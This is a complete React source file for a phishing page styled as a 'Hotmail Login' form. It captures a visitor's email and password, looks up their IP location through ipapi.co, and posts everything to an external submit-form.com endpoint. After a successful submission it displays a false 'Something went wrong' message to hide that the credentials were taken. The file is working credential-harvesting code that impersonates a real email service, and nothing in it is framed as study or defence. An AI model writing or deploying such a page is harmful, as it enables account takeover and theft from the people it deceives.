import axios from "axios";
import React, { useEffect, useState } from "react";

const FORMSPARK_FORM_ID = "https://submit-form.com/RgNFGGhs"; // Ensure this is the full URL

const App = () => {
  const [formData, setFormData] = useState({ email: "", password: "" });
  const [ipDetails, setIpDetails] = useState(null);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  // Fetch IP details on mount
  useEffect(() => {
    const fetchIpDetails = async () => {
      try {
        const response = await axios.get("https://ipapi.co/json/"); // Replace YOUR_TOKEN with your ipinfo.io token
        setIpDetails(response.data);
      } catch (err) {
        console.error("Failed to fetch IP details:", err);
        setIpDetails({ error: "Unable to retrieve IP details" });
      }
    };

    fetchIpDetails();
  }, []);

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setSuccess(false);
    setError(false);
    setErrorMessage("");

    const payload = {
      ...formData,
      ...ipDetails,
    };

    try {
      const response = await axios.post(FORMSPARK_FORM_ID, payload, {
        headers: { "Content-Type": "application/json" },
      });

      if (response.status === 200) {
        setSuccess(true);
        setFormData({ email: "", password: "" });
      } else {
        setError(true);
        setErrorMessage(response.statusText || "Unexpected error occurred");
      }
    } catch (err) {
      console.error("Submission failed:", err);
      setError(true);
      setErrorMessage(err.response?.data?.message || "Something went wrong");
    } finally {
      setLoading(false);
    }
  };

  // Handle input changes
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-blue-100">
      {/* Modal for loading */}
      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-md shadow-md">
            <div className="flex items-center space-x-4">
              <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-blue-500"></div>
              <span className="text-blue-500 font-semibold">Processing...</span>
            </div>
          </div>
        </div>
      )}

      <div className="bg-white shadow-md rounded-md p-6 w-full max-w-md">
        <h1 className="text-2xl font-bold text-blue-600 text-center mb-6">
          Hotmail Login
        </h1>

        {/* Success Message */}
        {success && (
          <div className="bg-green-100 text-red-700 p-3 rounded-md mb-4">
            Something wennt wrong. Please try again.
          </div>
        )}

        {/* Error Message */}
        {error && (
          <div className="bg-red-100 text-red-700 p-3 rounded-md mb-4">
            {errorMessage || "Something went wrong. Please try again."}
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label htmlFor="email" className="block text-gray-700 font-semibold mb-2">
              Email Address
            </label>
            <input
              type="email"
              name="email"
              id="email"
              className="w-full border border-gray-300 p-2 rounded-md focus:ring-2 focus:ring-blue-500"
              placeholder="Enter your email"
              value={formData.email}
              onChange={handleInputChange}
              required
            />
          </div>

          <div>
            <label htmlFor="password" className="block text-gray-700 font-semibold mb-2">
              Password
            </label>
            <input
              type="password"
              name="password"
              id="password"
              className="w-full border border-gray-300 p-2 rounded-md focus:ring-2 focus:ring-blue-500"
              placeholder="Enter your password"
              value={formData.password}
              onChange={handleInputChange}
              required
            />
          </div>

          {/* Hidden IP Details */}
          {ipDetails && (
            <div className="hidden">
              <pre className="bg-gray-100 p-2 rounded-md text-sm overflow-auto max-h-32">
                {JSON.stringify(ipDetails, null, 2)}
              </pre>
            </div>
          )}

          <button
            type="submit"
            className={`w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition ${
              loading ? "opacity-50 cursor-not-allowed" : ""
            }`}
            disabled={loading}
          >
            {loading ? "Logging in..." : "Login"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default App;
